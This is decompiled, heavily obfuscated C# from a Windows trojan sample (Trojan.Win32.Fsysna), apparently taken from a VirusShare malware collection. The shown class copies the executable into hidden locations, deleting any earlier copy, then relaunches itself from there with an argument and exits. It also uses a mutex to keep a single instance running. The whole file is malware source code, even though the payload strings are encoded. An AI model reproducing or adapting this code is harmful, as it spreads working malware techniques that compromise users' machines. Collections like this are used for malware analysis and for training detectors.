// Decompiled with JetBrains decompiler
// Type: .
// Assembly: MyApplication, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C1CA376-1B35-4961-80E8-8029AD6B5A8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Fsysna.deeq-bccdbf807edf4ae3f172c9e102415d19675fee38175dc7fe4f296402da8186a9.exe

using \u0003;
using \u0005;
using \u0019;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0019
{
  internal static class \u001A
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    public static bool \u0001;
    public static bool \u0002;
    public static string \u0003;
    public static string \u0004;

    [STAThread]
    public static void \u009D()
    {
      string str1 = \u0087\u0002.\u0090\u0002(\u001A.\u0001(2316));
      string str2 = \u0087\u0002.\u0090\u0002(\u001A.\u0001(2325));
      try
      {
        if (\u001C\u0002.\u0006\u0004(\u0005\u0003.\u0011\u0004(str1, \u001A.\u0001(2334))))
          \u0014\u0002.\u0005\u0004(\u0005\u0003.\u0011\u0004(str1, \u001A.\u0001(2334)));
        \u001B\u0002.\u0004\u0004(\u0006\u0003.\u0008(), \u0005\u0003.\u0011\u0004(str1, \u001A.\u0001(2334)));
        \u001A.\u0003 = \u0005\u0003.\u0011\u0004(str1, \u001A.\u0001(2334));
      }
      catch
      {
      }
      if (\u001A.\u0003 == null)
      {
        try
        {
          if (\u001C\u0002.\u0006\u0004(\u0005\u0003.\u0011\u0004(str2, \u001A.\u0001(2334))))
            \u0014\u0002.\u0005\u0004(\u0005\u0003.\u0011\u0004(str2, \u001A.\u0001(2334)));
          \u001B\u0002.\u0004\u0004(\u0006\u0003.\u0008(), \u0005\u0003.\u0011\u0004(str2, \u001A.\u0001(2334)));
          \u001A.\u0003 = \u0005\u0003.\u0011\u0004(str2, \u001A.\u0001(2334));
        }
        catch
        {
        }
      }
      Process process = new Process();
      \u0008\u0002.\u007E\u0099((object) \u0096\u0002.\u007E\u0096((object) process), \u001A.\u0003);
      \u0008\u0002.\u007E\u0098((object) \u0096\u0002.\u007E\u0096((object) process), \u001A.\u0001(2351));
      int num = \u0084.\u007E\u0097((object) process) ? 1 : 0;
      \u0083\u0002.\u008F\u0002(0);
    }

    private static void \u0084([In] string[] obj0)
    {
      \u0083\u0002.\u0014\u0003(5000);
      if (\u0082\u0002.\u0013\u0002(\u001A.\u0004, \u001A.\u0001(2334)))
        \u001A.\u009D();
      if (((IEnumerable<string>) obj0).Count<string>() >= 1)
      {
        if (\u0082\u0002.\u0012\u0002(obj0[0], \u001A.\u0001(2351)))
          \u001A.\u0001 = true;
      }
      try
      {
        Mutex mutex = new Mutex(true, \u001A.\u0001(2360), out \u001A.\u0002);
        try
        {
          if (!\u001A.\u0002)
            return;
          \u0092\u0002.\u000F();
          \u009D.\u0011(false);
          \u0015\u0002.\u0010((Form) new \u001C());
        }
        finally
        {
          if (mutex != null)
            \u009E.\u007E\u0011\u0002((object) mutex);
        }
      }
      catch
      {
      }
    }

    static \u001A()
    {
      \u0004.\u007F();
      \u001A.\u0002 = true;
      \u001A.\u0003 = (string) null;
      \u001A.\u0004 = \u0087\u0002.\u0010\u0004(\u0006\u0003.\u0008());
    }
  }
}
